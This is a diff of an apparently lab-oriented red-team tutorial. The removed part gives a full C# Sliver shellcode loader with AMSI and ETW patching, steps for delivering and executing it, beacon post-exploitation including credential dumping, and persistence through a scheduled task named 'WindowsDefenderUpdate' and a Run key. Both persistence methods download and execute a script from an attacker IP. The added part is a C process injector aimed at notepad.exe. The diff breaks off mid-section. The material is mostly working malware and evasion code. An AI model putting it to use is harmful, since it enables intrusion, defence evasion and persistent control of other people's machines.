+        PROCESS_ALL_ACCESS,  // We need full access
+        FALSE,               // Don't inherit handle
+        targetPID
     );
     
-    [DllImport("kernel32.dll")]
-    static extern IntPtr CreateThread(
-        IntPtr lpThreadAttributes, 
-        uint dwStackSize, 
-        IntPtr lpStartAddress, 
-        IntPtr lpParameter, 
-        uint dwCreationFlags, 
-        IntPtr lpThreadId
+    if (hProcess == NULL) {
+        printf("OpenProcess failed. Error: %d\n", GetLastError());
+        return 1;
+    }
+    
+    printf("Opened process successfully\n");
+    
+    // Step 3: Allocate memory in the target process
+    LPVOID remoteBuffer = VirtualAllocEx(
+        hProcess,                       // Target process
+        NULL,                           // Let Windows choose address
+        sizeof(shellcode),              // Size
+        MEM_COMMIT | MEM_RESERVE,       // Allocate it
+        PAGE_EXECUTE_READWRITE          // RWX
     );
     
-    [DllImport("kernel32.dll")]
-    static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
-    
-    // ============================================================
-    // SECTION 2: Constants (Memory allocation flags)
-    // ============================================================
-    // These are values defined by Microsoft. We use them with VirtualAlloc.
-    
-    // MEM_COMMIT = 0x1000 means "actually allocate the memory for use"
-    const uint MEM_COMMIT = 0x1000;
-    
-    // MEM_RESERVE = 0x2000 means "reserve address space (but don't allocate yet)"
-    // We use both together (0x3000) to reserve AND commit in one call
-    const uint MEM_RESERVE = 0x2000;
-    
-    // PAGE_EXECUTE_READWRITE = 0x40 means "this memory can be read, written, AND executed"
-    // This is CRITICAL - normal memory can't execute code!
-    // Security tools flag this because legitimate programs rarely need it
-    const uint PAGE_EXECUTE_READWRITE = 0x40;
-    
-    // INFINITE = 0xFFFFFFFF means "wait forever" (used with WaitForSingleObject)
-    const uint INFINITE = 0xFFFFFFFF;
-    
-    // ============================================================
-    // XOR KEY - THIS MUST MATCH YOUR ENCRYPTION KEY!
-    // ============================================================
-    // When you ran encrypt_shellcode.py, it used key 0x35
-    // If you changed that, change this to match
-    const byte XOR_KEY = 0x35;
-    
-    // ============================================================
-    // SECTION 3: YOUR ENCRYPTED SHELLCODE GOES HERE
-    // ============================================================
-    //
-    // !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-    // !!! THIS IS WHERE YOU PASTE YOUR ENCRYPTED SHELLCODE !!!
-    // !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-    //
-    // HOW TO GET YOUR SHELLCODE:
-    // --------------------------
-    // Step 1: On Kali, you ran: python3 encrypt_shellcode.py beacon.bin beacon_encrypted.bin
-    // Step 2: This created a file: /tmp/beacon_encrypted.cs
-    // Step 3: Open that file: cat /tmp/beacon_encrypted.cs
-    // Step 4: Copy EVERYTHING between the curly braces { }
-    // Step 5: Paste it below, REPLACING the placeholder bytes
-    //
-    // WHAT THE FILE LOOKS LIKE:
-    // -------------------------
-    // // Encrypted shellcode - paste this into your loader
-    // byte[] encryptedShellcode = new byte[] {
-    //     0xc9, 0x7d, 0xb6, 0xd1, 0xc5, 0xdd, 0xdb, 0x9c, 0x9c, 0x9c, 0x5c, 0x64,
-    //     0x5c, 0x65, 0x4d, 0x64, 0x62, 0x53, 0xad, 0xe5, 0x4d, 0x64, 0x62, 0x6b,
-    //     ... (thousands more bytes) ...
-    //     0xa9, 0xbc, 0x98
-    // };
-    //
-    // COPY ALL THE BYTES (0xc9, 0x7d, 0xb6...) AND PASTE BELOW:
-    //
-    // !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-    
-    static byte[] encryptedShellcode = new byte[] {
-        // =============================================================
-        // DELETE THESE PLACEHOLDER BYTES AND PASTE YOUR REAL SHELLCODE
-        // =============================================================
-        // These are EXAMPLE bytes - they will NOT work!
-        // Your real shellcode will be MUCH larger (usually 100,000+ bytes)
-        
-        0x7d, 0xbc, 0x69, 0x11, 0x3d, 0x4a, 0x2f, 0x87, 0x00, 0x00, 0x00, 0x00
-        
-        // REPLACE THE LINE ABOVE WITH YOUR ACTUAL ENCRYPTED SHELLCODE
-        // It will look like this (but MUCH longer):
-        // 0xc9, 0x7d, 0xb6, 0xd1, 0xc5, 0xdd, 0xdb, 0x9c, 0x9c, 0x9c, 0x5c, 0x64,
-        // 0x5c, 0x65, 0x4d, 0x64, 0x62, 0x53, 0xad, 0xe5, 0x4d, 0x64, 0x62, 0x6b,
-        // ... continuing for hundreds of lines ...
-    };
-    
-    // ============================================================
-    // SECTION 4: AMSI Bypass
-    // ============================================================
-    
-    static void PatchAMSI()
-    {
-        Console.WriteLine("[*] Patching AMSI...");
-        
-        try
-        {
-            // Step 1: Load amsi.dll
-            IntPtr hAmsi = LoadLibrary("amsi.dll");
-            if (hAmsi == IntPtr.Zero)
-            {
-                Console.WriteLine("[!] Failed to load amsi.dll (might not be present)");
-                return;
-            }
-            
-            // Step 2: Find AmsiScanBuffer
-            IntPtr pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
-            if (pAmsiScanBuffer == IntPtr.Zero)
-            {
-                Console.WriteLine("[!] Failed to find AmsiScanBuffer");
-                return;
-            }
-            
-            // Step 3: Make it writable
-            uint oldProtect;
-            VirtualProtect(pAmsiScanBuffer, 6, PAGE_EXECUTE_READWRITE, out oldProtect);
-            
-            // Step 4: Write our patch
-            // mov eax, 0x80070057 (E_INVALIDARG) ; ret
-            byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
-            Marshal.Copy(patch, 0, pAmsiScanBuffer, patch.Length);
-            
-            Console.WriteLine("[+] AMSI patched successfully!");
-        }
-        catch (Exception e)
-        {
-            Console.WriteLine($"[!] AMSI patch error: {e.Message}");
-        }
+    if (remoteBuffer == NULL) {
+        printf("VirtualAllocEx failed. Error: %d\n", GetLastError());
+        CloseHandle(hProcess);
+        return 1;
     }
     
-    // ============================================================
-    // SECTION 5: ETW Bypass
-    // ============================================================
+    printf("Allocated memory in target at: %p\n", remoteBuffer);
     
-    static void PatchETW()
-    {
-        Console.WriteLine("[*] Patching ETW...");
-        
-        try
-        {
-            // ntdll.dll is always loaded
-            IntPtr hNtdll = LoadLibrary("ntdll.dll");
-            if (hNtdll == IntPtr.Zero)
-            {
-                Console.WriteLine("[!] Failed to load ntdll.dll");
-                return;
-            }
-            
-            // Find EtwEventWrite
-            IntPtr pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
-            if (pEtwEventWrite == IntPtr.Zero)
-            {
-                Console.WriteLine("[!] Failed to find EtwEventWrite");
-                return;
-            }
-            
-            // Make it writable
-            uint oldProtect;
-            VirtualProtect(pEtwEventWrite, 1, PAGE_EXECUTE_READWRITE, out oldProtect);
-            
-            // Write 'ret' instruction (0xC3)
-            Marshal.WriteByte(pEtwEventWrite, 0xC3);
-            
-            Console.WriteLine("[+] ETW patched successfully!");
-        }
-        catch (Exception e)
-        {
-            Console.WriteLine($"[!] ETW patch error: {e.Message}");
-        }
+    // Step 4: Write shellcode to the target process
+    SIZE_T bytesWritten;
+    BOOL success = WriteProcessMemory(
+        hProcess,           // Target process
+        remoteBuffer,       // Destination
+        shellcode,          // Source
+        sizeof(shellcode),  // Size
+        &bytesWritten       // How many bytes written
+    );
+    
+    if (!success) {
+        printf("WriteProcessMemory failed. Error: %d\n", GetLastError());
+        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
+        CloseHandle(hProcess);
+        return 1;
     }
     
-    // ============================================================
-    // SECTION 6: Shellcode Decryption
-    // ============================================================
+    printf("Wrote %zu bytes to target\n", bytesWritten);
     
-    static byte[] DecryptShellcode(byte[] encrypted, byte key)
-    {
-        Console.WriteLine($"[*] Decrypting {encrypted.Length} bytes with key 0x{key:X2}...");
-        
-        byte[] decrypted = new byte[encrypted.Length];
-        for (int i = 0; i < encrypted.Length; i++)
-        {
-            decrypted[i] = (byte)(encrypted[i] ^ key);
-        }
-        
-        Console.WriteLine("[+] Shellcode decrypted!");
-        return decrypted;
+    // Step 5: Create a thread in the target that executes our shellcode
+    HANDLE hRemoteThread = CreateRemoteThread(
+        hProcess,           // Target process
+        NULL,               // Default security
+        0,                  // Default stack size
+        (LPTHREAD_START_ROUTINE)remoteBuffer,  // Start address = our shellcode
+        NULL,               // No parameters
+        0,                  // Run immediately
+        NULL                // Don't need thread ID
+    );
+    
+    if (hRemoteThread == NULL) {
+        printf("CreateRemoteThread failed. Error: %d\n", GetLastError());
+        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
+        CloseHandle(hProcess);
+        return 1;
     }
     
-    // ============================================================
-    // SECTION 7: Shellcode Execution
-    // ============================================================
+    printf("Created remote thread successfully!\n");
+    printf("Shellcode is now running in notepad.exe!\n");
     
-    static void ExecuteShellcode(byte[] shellcode)
-    {
-        Console.WriteLine("[*] Allocating executable memory...");
-        
-        // Allocate memory with RWX permissions
-        IntPtr shellcodeAddr = VirtualAlloc(
-            IntPtr.Zero,                           // Let Windows choose address
-            (uint)shellcode.Length,                // Size of shellcode
-            MEM_COMMIT | MEM_RESERVE,              // 0x3000
-            PAGE_EXECUTE_READWRITE                 // 0x40 - RWX
-        );
-        
-        if (shellcodeAddr == IntPtr.Zero)
-        {
-            Console.WriteLine("[!] Failed to allocate memory!");
-            return;
-        }
-        
-        Console.WriteLine($"[+] Memory allocated at 0x{shellcodeAddr.ToInt64():X}");
-        
-        // Copy shellcode to allocated memory
-        Console.WriteLine("[*] Copying shellcode to memory...");
-        Marshal.Copy(shellcode, 0, shellcodeAddr, shellcode.Length);
-        
-        // Create thread that starts at shellcode
-        Console.WriteLine("[*] Creating thread at shellcode address...");
-        IntPtr hThread = CreateThread(
-            IntPtr.Zero,      // Default security
-            0,                // Default stack size
-            shellcodeAddr,    // Start address = our shellcode
-            IntPtr.Zero,      // No parameters
-            0,                // Start immediately
-            IntPtr.Zero       // Don't need thread ID
-        );
-        
-        if (hThread == IntPtr.Zero)
-        {
-            Console.WriteLine("[!] Failed to create thread!");
-            return;
-        }
-        
-        Console.WriteLine("[+] Thread created! Shellcode executing...");
-        Console.WriteLine("[*] Beacon should connect to C2. Waiting...");
-        
-        // Wait for thread (beacon runs indefinitely)
-        WaitForSingleObject(hThread, INFINITE);
-    }
+    // Wait for thread to complete (optional)
+    WaitForSingleObject(hRemoteThread, INFINITE);
     
-    // ============================================================
-    // SECTION 8: Main Entry Point
-    // ============================================================
+    // Cleanup
+    CloseHandle(hRemoteThread);
+    VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
+    CloseHandle(hProcess);
     
-    static void Main(string[] args)
-    {
-        Console.WriteLine(@"
-   _____ _ _                   _                     _           
-  / ____| (_)                 | |                   | |          
- | (___ | |___   _____ _ __   | |     ___   __ _  __| | ___ _ __ 
-  \___ \| | \ \ / / _ \ '__|  | |    / _ \ / _` |/ _` |/ _ \ '__|
-  ____) | | |\ V /  __/ |     | |___| (_) | (_| | (_| |  __/ |   
- |_____/|_|_| \_/ \___|_|     |______\___/ \__,_|\__,_|\___|_|   
-                                                                
-          ORSUBANK Red Team - Lab Exercise
-        ");
-        
-        Console.WriteLine("\n[*] Starting loader...\n");
-        
-        // Step 1: Bypass security
-        PatchAMSI();
-        PatchETW();
-        
-        Console.WriteLine();
-        
-        // Step 2: Decrypt shellcode
-        byte[] decrypted = DecryptShellcode(encryptedShellcode, XOR_KEY);
-        
-        Console.WriteLine();
-        
-        // Step 3: Execute shellcode
-        ExecuteShellcode(decrypted);
-        
-        // Note: If beacon is running, we never reach here
-        Console.WriteLine("\n[*] Loader finished.");
-    }
+    printf("Done.\n");
+    return 0;
 }
 ```
 
-## 12.3: Insert Your Encrypted Shellcode
+## Try It:
 
-**Open the encrypted shellcode file:**
+1. Open notepad.exe
+2. Compile the injection program: `cl injector.c`
+3. Run it: `injector.exe`
+4. It injects into notepad!
 
-```bash
-cat /tmp/beacon_encrypted.cs
-```
+With the harmless shellcode (NOP NOP RET), notepad will not visibly do anything. But the shellcode ran inside notepad's process.
 
-**Copy the byte array and paste it into `Program.cs`**, replacing the placeholder line in SECTION 3.
+## Why This Technique is Powerful
 
-## 12.4: Compile the Loader
+- Shellcode runs in a legitimate process
+- Harder to detect (it is just notepad doing "something")
+- Survives if your injector program closes
+- Can inject into higher privileged processes
 
-**Build the loader:**
+## Why This Gets Detected
 
-```bash
-# Compile as a single-file executable
-dotnet publish -c Release -r win-x64 --self-contained true -p:PublishSingleFile=true -p:EnableCompressionInSingleFile=true
-```
+- OpenProcess with PROCESS_ALL_ACCESS is suspicious
+- VirtualAllocEx allocating RWX memory is suspicious
+- CreateRemoteThread is heavily monitored by EDRs
 
-**What do these options do?**
+Modern evasion uses different techniques:
+- APC injection (QueueUserAPC)
+- Thread hijacking
+- Direct syscalls to avoid hooks
+- Unhooking ntdll
 
-| Option | Meaning |
-|--------|---------|
-| `-c Release` | Build in Release mode (optimized, no debug info) |
-| `-r win-x64` | Target Windows 64-bit |
-| `--self-contained true` | Include .NET runtime (runs without .NET installed on target) |
-| `-p:PublishSingleFile=true` | Package everything into ONE .exe file |
-| `-p:EnableCompressionInSingleFile=true` | Compress it to make it smaller |
-
-**Find your compiled loader:**
-
-```bash
-ls -la bin/Release/net8.0/win-x64/publish/
-```
-
-You should see `SliverLoader.exe` - this is your payload!
-
-## 12.5: Transfer the Loader to Target
-
-**Option 1: HTTP Server (Recommended)**
-
-```bash
-# On Kali, serve the file
-cd bin/Release/net8.0/win-x64/publish/
-python3 -m http.server 8080
-```
-
-On Windows target (PowerShell):
-```powershell
-# Download the loader
-Invoke-WebRequest -Uri "http://192.168.100.100:8080/SliverLoader.exe" -OutFile "C:\Temp\SliverLoader.exe"
-```
-
-**Option 2: Using Impacket's smbserver**
-
-```bash
-# On Kali
-impacket-smbserver share . -smb2support
-```
-
-On Windows:
-```powershell
-copy \\192.168.100.100\share\SliverLoader.exe C:\Temp\
-```
+We cover evasion in the next chapters.
 
 ---
 
-# PART 13: Running the Attack {#part-13-attack}
+*End of Portion 7 - Chapters 26, 27, 28, 29*
 
-Now let's execute the attack!
+*What you learned:*
+- *Shellcode is just machine code bytes that run when executed*
+- *Shellcode must find API addresses at runtime (position independent)*
+- *A loader allocates executable memory, copies shellcode, and jumps to it*
+- *Process injection runs shellcode inside another process*
+- *CreateRemoteThread is the classic injection method*
 
-## 13.1: Pre-Attack Checklist
+*Hands-on code we wrote:*
+- *Simple shellcode loader*
+- *Process injection - inject into notepad.exe*
 
-Before running, verify:
-
-| Check | Command |
-|-------|---------|
-| Sliver listener running | `sliver > jobs` |
-| Kali can ping target | `ping 192.168.100.20` |
-| Target can ping Kali | `ping 192.168.100.100` (from Windows) |
-| Loader is on target | Check `C:\Temp\SliverLoader.exe` exists |
-
-## 13.2: Execute the Loader
-
-**On the Windows target (as any user):**
-
-```powershell
-# Navigate to the loader location
-cd C:\Temp
-
-# Run the loader
-.\SliverLoader.exe
-```
-
-**What you should see on the target:**
-
-```
-   _____ _ _                   _                     _           
-  / ____| (_)                 | |                   | |          
- | (___ | |___   _____ _ __   | |     ___   __ _  __| | ___ _ __ 
-  \___ \| | \ \ / / _ \ '__|  | |    / _ \ / _` |/ _` |/ _ \ '__|
-  ____) | | |\ V /  __/ |     | |___| (_) | (_| | (_| |  __/ |   
- |_____/|_|_| \_/ \___|_|     |______\___/ \__,_|\__,_|\___|_|   
-                                                                
-          ORSUBANK Red Team - Lab Exercise Only
-        
-
-[*] Starting loader...
-
-[*] Patching AMSI...
-[+] AMSI patched successfully!
-[*] Patching ETW...
-[+] ETW patched successfully!
-
-[*] Decrypting 123456 bytes with key 0x35...
-[+] Shellcode decrypted!
-
-[*] Allocating executable memory...
-[+] Memory allocated at 0x1A0000000000
-[*] Copying shellcode to memory...
-[*] Creating thread at shellcode address...
-[+] Thread created! Shellcode executing...
-[*] Beacon should connect to C2. Waiting...
-```
-
-## 13.3: Check for Beacon in Sliver
-
-**Back in Sliver console on Kali:**
-
-```bash
-sliver > beacons
-```
-
-**What you should see:**
-
-```
- ID         Name            Transport   Hostname   Username        OS/Arch              Last Check-In
-========== =============== =========== ========== =============== ==================== ==============
- abc123de   HUNGRY_ZEBRA    https       WS01       ORSUBANK\jlee   windows/amd64        1s ago
-```
-
-ðŸŽ‰ **You have a beacon!**
-
-## 13.4: Interacting with the Beacon
-
-**Use the beacon:**
-
-```bash
-# Connect to the beacon
-sliver > use abc123de
-
-# Or use the name
-sliver > use HUNGRY_ZEBRA
-
-# You're now in a beacon context
-sliver (HUNGRY_ZEBRA) >
-```
-
-**Run commands:**
-
-```bash
-# Get system info
-sliver (HUNGRY_ZEBRA) > info
-
-# Get current user
-sliver (HUNGRY_ZEBRA) > whoami
-
-# List files
-sliver (HUNGRY_ZEBRA) > ls C:\\Users
-
-# Get processes
-sliver (HUNGRY_ZEBRA) > ps
-```
-
-**Note about beacon timing:**
-
-Beacons check in periodically (default is around 60 seconds). When you run a command:
-1. The command is queued on the C2 server
-2. Next time the beacon checks in, it receives the command
-3. It executes and queues the result
-4. Next check-in, you see the result
-
-For faster interaction, you can use sessions (but they're noisier).
-
-## 13.5: What Just Happened?
-
-Let's trace the full attack:
-
-```
-1. SliverLoader.exe started
-         |
-         v
-2. AMSI patched - Defender can't scan script content
-         |
-         v
-3. ETW patched - No logging of our activities
-         |
-         v
-4. Encrypted shellcode decrypted in memory
-         |
-         v
-5. Memory allocated with PAGE_EXECUTE_READWRITE
-         |
-         v
-6. Decrypted shellcode copied to memory
-         |
-         v
-7. CreateThread started executing shellcode
-         |
-         v
-8. Shellcode connected to 192.168.100.100:443 (HTTPS)
-         |
-         v
-9. Sliver received beacon connection
-         |
-         v
-10. WE CONTROL THE MACHINE!
-```
+*Next portion: Command and Control with Sliver*
 
 ---
----
-
-# PART 14: Post-Exploitation Commands {#part-14-postexploit}
-
-Now that you have a beacon, let's explore what you can do with it.
-
-## 14.1: Basic Reconnaissance Commands
-
-**In the Sliver console, after selecting your beacon:**
-
-```bash
-sliver > use <beacon-id>
-sliver (BEACON_NAME) >
-```
-
-### System Information
-
-```bash
-# Get detailed system info
-info
-
-# Expected output:
-#         Beacon ID: abc123de-1234-5678-abcd-ef1234567890
-#             Name: HUNGRY_ZEBRA
-#         Hostname: WS01.orsubank.local
-#             UUID: 12345678-abcd-1234-abcd-123456789abc
-#         Username: ORSUBANK\jlee
-#              UID: S-1-5-21-...
-#              GID: S-1-5-21-...
-#              PID: 4568
-#               OS: windows
-#          Version: 10.0.22631
-#             Arch: amd64
-```
-
-### Current User
-
-```bash
-# Who am I?
-whoami
-
-# Output: ORSUBANK\jlee
-```
-
-### Network Information
-
-```bash
-# Get network interfaces
-ifconfig
-
-# Output shows IP addresses, MAC addresses, interface names
-```
-
-### Process List
-
-```bash
-# List running processes
-ps
-
-# Look for interesting processes:
-# - lsass.exe (credentials here!)
-# - winlogon.exe
-# - explorer.exe
-# - defender processes (MsMpEng.exe)
-```
-
-## 14.2: File System Commands
-
-```bash
-# List directory contents
-ls C:\\Users
-
-# Change directory
-cd C:\\Users\\jlee\\Desktop
-
-# Print working directory
-pwd
-
-# Download a file from target to your Kali
-download C:\\Users\\jlee\\Desktop\\passwords.txt
-
-# Upload a file from Kali to target
-upload /tmp/tools/mimikatz.exe C:\\Temp\\m.exe
-
-# Read a file
-cat C:\\Windows\\System32\\drivers\\etc\\hosts
-```
-
-## 14.3: Execute Commands
-
-```bash
-# Run a shell command (spawns cmd.exe)
-shell whoami /all
-
-# Run PowerShell (be careful - can trigger detection!)
-powershell Get-Process
-
-# Execute a program
-execute C:\\Windows\\System32\\notepad.exe
-```
-
-## 14.4: Credential Gathering
-
-**Important:** These commands are more likely to trigger detection!
-
-```bash
-# Dump credentials (requires SYSTEM or admin)
-# First, check if you're admin:
-getprivs
-
-# If admin, try:
-hashdump    # Dump local SAM database
-```
-
-## 14.5: Lateral Movement Preparation
-
-```bash
-# Get domain information
-shell net user /domain
-shell net group "Domain Admins" /domain
-
-# See what shares are accessible
-shell net view \\\\DC01
-
-# Check current tokens/privileges
-getprivs
-```
-
----
-
-# PART 15: Troubleshooting Common Issues {#part-15-troubleshoot}
-
-Things don't always work perfectly. Here's how to fix common problems.
-
-## 15.1: Loader Runs But No Beacon
-
-**Symptoms:** Loader shows success messages but no beacon appears in Sliver.
-
-**Check 1: Is the listener running?**
-```bash
-sliver > jobs
-
-# If no jobs listed, restart listener:
-sliver > https -l 192.168.100.100 -p 443
-```
-
-**Check 2: Can target reach Kali?**
-
-On Windows target:
-```powershell
-# Test connectivity
-Test-NetConnection -ComputerName 192.168.100.100 -Port 443
-```
-
-**Check 3: Firewall blocking traffic?**
-
-On Kali:
-```bash
-# Allow port 443
-sudo ufw allow 443/tcp
-
-# Or disable firewall for testing
-sudo ufw disable
-```
-
-On Windows (check if outbound is blocked):
-```powershell
-# Test with browser
-Start-Process "https://192.168.100.100:443"
-```
-
-**Check 4: Wrong shellcode?**
-
-- Did you paste the encrypted shellcode correctly?
-- Did you use the same XOR key (0x35) in encryption and loader?
-- Is the shellcode for the correct architecture (amd64)?
-
-## 15.2: AMSI Blocking Our Loader
-
-**Symptoms:** Defender blocks the .exe before it runs, or PowerShell commands fail.
-
-**Solution 1: Loader is detected**
-
-The loader itself might be getting flagged. Try:
-- Recompile with different options
-- Rename the executable
-- Use a packer (advanced)
-
-**Solution 2: AMSI patch detected**
-
-The AMSI patch bytes might be signatured. Try alternative patches:
-
-```csharp
-// Alternative AMSI patch (returns AMSI_RESULT_CLEAN)
-byte[] patch = { 0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3 }; // mov eax, 0; ret
-```
-
-## 15.3: ETW Patch Crashes the Process
-
-**Symptoms:** Loader crashes when patching ETW.
-
-**Cause:** On some Windows versions, EtwEventWrite might have different prologue bytes.
-
-**Solution:** Skip ETW patching if it fails:
-```csharp
-try
-{
-    PatchETW();
-}
-catch
-{
-    Console.WriteLine("[!] ETW patch skipped");
-}
-```
-
-## 15.4: .NET SDK Installation Issues
-
-**Problem:** `dotnet: command not found`
-
-```bash
-# Verify .NET is installed
-which dotnet
-
-# If not found, reinstall
-sudo apt update
-sudo apt install -y dotnet-sdk-8.0
-
-# Add to PATH if needed
-export PATH="$PATH:$HOME/.dotnet"
-echo 'export PATH="$PATH:$HOME/.dotnet"' >> ~/.bashrc
-```
-
-## 15.5: Sliver Won't Start
-
-**Problem:** Permission denied or port already in use.
-
-```bash
-# Run as root
-sudo sliver-server
-
-# Check if port 443 is in use
-sudo netstat -tlnp | grep 443
-
-# Kill conflicting process
-sudo kill <PID>
-
-# Or use a different port
-sliver > https -l 192.168.100.100 -p 8443
-```
-
-## 15.6: Beacon Connects Then Immediately Dies
-
-**Cause:** Main process exiting before beacon establishes.
-
-**Solution:** Make sure WaitForSingleObject is called with INFINITE:
-```csharp
-WaitForSingleObject(hThread, 0xFFFFFFFF); // INFINITE
-```
-
----
-
-# PART 16: MITRE ATT&CK Mapping {#part-16-mitre}
-
-Understanding how our attack maps to the MITRE ATT&CK framework is important for interviews and blue team awareness.
-
-## 16.1: Techniques Used in This Attack
-
-| Tactic | Technique ID | Technique Name | How We Used It |
-|--------|-------------|----------------|----------------|
-| **Execution** | T1059.001 | PowerShell | PowerShell to download loader |
-| **Execution** | T1106 | Native API | VirtualAlloc, CreateThread for shellcode |
-| **Defense Evasion** | T1562.001 | Disable/Modify Tools | Patching AMSI and ETW |
-| **Defense Evasion** | T1027 | Obfuscated Files | XOR encrypted shellcode |
-| **Defense Evasion** | T1055 | Process Injection | Executing shellcode in memory |
-| **Defense Evasion** | T1140 | Deobfuscate/Decode | Decrypting shellcode at runtime |
-| **Command and Control** | T1071.001 | Web Protocols | HTTPS beacon communication |
-| **Command and Control** | T1573.002 | Encrypted Channel | TLS/HTTPS encryption |
-
-## 16.2: MITRE ATT&CK Navigator
-
-You can visualize these techniques at: https://mitre-attack.github.io/attack-navigator/
-
-**Our attack chain:**
-```
-Initial Access -> Execution -> Defense Evasion -> C2
-```
-
----
-
----
-
-# PART 17: Persistence with Defender Bypass {#part-17-persistence}
-
-Once you have initial access, you want to KEEP that access. If the user restarts their computer, closes the process, or your beacon dies - you lose access. Persistence solves this.
-
-## 18.1: What is Persistence?
-
-**Definition:** Persistence is any technique that allows malware to survive system restarts or user logoffs.
-
-**Attacker perspective:** You've got a beacon running. If the user reboots, you lose it. Persistence ensures your malware starts again automatically.
-
-**Common persistence locations:**
-
-| Location | How it works | Detection risk |
-|----------|-------------|----------------|
-| Scheduled Tasks | Windows runs our code at specified times/events | Medium |
-| Registry Run Keys | Windows runs our code at login | Medium-High |
-| Services | Windows runs our code as a service | High (requires admin) |
-| Startup Folder | Simple, drops executable in startup path | High (obvious) |
-| WMI Subscriptions | Event-based execution | Medium |
-| DLL Hijacking | Legitimate app loads our DLL | Low (stealthy) |
-
-## 18.2: The Challenge - Defender is Watching
-
-**All persistence locations are monitored by Defender.**
-
-When you:
-- Create a scheduled task â†’ Defender inspects it
-- Add a registry run key â†’ Defender scans the executable
-- Install a service â†’ Defender monitors the binary
-
-**Our strategy:**
-1. Use encoded/obfuscated commands
-2. Store payload remotely (not on disk)
-3. Use LOLBins (Living Off the Land Binaries)
-4. Leverage existing Sliver infrastructure
-
-## 18.3: Persistence Method 1 - Scheduled Task (Recommended)
-
-**Why scheduled tasks?**
-- Work with regular user privileges
-- Can trigger on multiple events (logon, time, etc.)
-- Can use PowerShell to download and execute
-
-### 18.3.1: The Payload Strategy
-
-Instead of dropping a file, we'll have the scheduled task:
-1. Download the loader from our C2
-2. Execute it in memory
-3. Re-establish the beacon
-
-**Create a persistence payload in Sliver:**
-
-First, generate a stageless PowerShell payload:
-
-```bash
-# In Sliver console
-sliver > generate beacon --http 192.168.100.100:443 --os windows --arch amd64 --format shellcode --save /tmp/persist.bin
-```
-
-**Encode it for PowerShell:**
-
-```bash
-# On Kali
-base64 -w 0 /tmp/persist.bin > /tmp/persist.b64
-```
-
-### 18.3.2: Create the Scheduled Task (via Sliver)
-
-**From your active beacon:**
-
-```bash
-sliver (HUNGRY_ZEBRA) > shell
-```
-
-**Create a scheduled task that runs at logon:**
-
-```powershell
-# Create scheduled task - runs at user logon
-schtasks /create /tn "WindowsDefenderUpdate" /tr "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.100.100:8080/update.ps1')\"" /sc onlogon /ru "%USERNAME%" /f
-```
-
-**Breaking down the command:**
-
-| Part | What it does |
-|------|-------------|
-| `/tn "WindowsDefenderUpdate"` | Task name (looks legitimate) |
-| `/tr "powershell..."` | Command to run |
-| `-WindowStyle Hidden` | No visible window |
-| `-NoProfile` | Don't load PowerShell profile (faster, less noise) |
-| `-ExecutionPolicy Bypass` | Allow script execution |
-| `IEX (...).DownloadString(...)` | Download and execute script |
-| `/sc onlogon` | Trigger: when any user logs on |
-| `/ru "%USERNAME%"` | Run as current user |
-| `/f` | Force overwrite if exists |
-
-### 18.3.3: Create the Persistence Script (on Kali)
-
-**Create `/var/www/html/update.ps1`:**
-
-```powershell
-# AMSI Bypass
-$a = [Ref].Assembly.GetTypes()
-ForEach($t in $a) {
-    if ($t.Name -like "*siUtils") {
-        $t.GetFields('NonPublic,Static') | ForEach-Object {
-            if ($_.Name -like "*Context") {
-                $_.SetValue($null, [IntPtr]::Zero)
-            }
-        }
-    }
-}
-
-# Download and execute shellcode
-$bytes = (New-Object System.Net.WebClient).DownloadData("http://192.168.100.100:8080/persist.bin")
-
-# Decrypt (XOR with key 0x35)
-$key = 0x35
-$decrypted = @()
-foreach ($byte in $bytes) {
-    $decrypted += ($byte -bxor $key)
-}
-
-# Allocate RWX memory
-$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($decrypted.Length)
-[System.Runtime.InteropServices.Marshal]::Copy($decrypted, 0, $mem, $decrypted.Length)
-
-# Create thread
-$callback = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($mem, [IntPtr])
-$callback.Invoke()
-```
-
-**Note:** This is a simplified example. For real engagements, use more sophisticated obfuscation.
-
-### 18.3.4: Host the Files
-
-```bash
-# On Kali
-cd /var/www/html
-sudo cp /tmp/persist.bin .
-sudo systemctl start apache2
-
-# Or use Python
-python3 -m http.server 8080
-```
-
-### 18.3.5: Verify the Task
-
-**Check the task was created:**
-
-```powershell
-schtasks /query /tn "WindowsDefenderUpdate"
-```
-
-**Output:**
-```
-TaskName                                 Next Run Time          Status
-======================================== ====================== ===============
-WindowsDefenderUpdate                    At logon time          Ready
-```
-
-## 18.4: Persistence Method 2 - Registry Run Key
-
-**Registry keys that run programs at logon:**
-
-| Key | Scope | Requires Admin |
-|-----|-------|----------------|
-| `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` | Current user only | No |
-| `HKLM\Software\Microsoft\Windows\CurrentVersion\Run` | All users | Yes |
-| `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce` | Current user, once | No |
-
-### 18.4.1: Add Registry Persistence (User-Level)
-
-```powershell
-# From Sliver beacon
-shell reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SecurityUpdate" /t REG_SZ /d "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.100.100:8080/update.ps1')\"" /f
-```
-
-**Verify:**
-
-```powershell
-reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
-```
-
-### 18.4.2: MSHTA Variant (Bypasses AppLocker Sometimes)
-
-```powershell
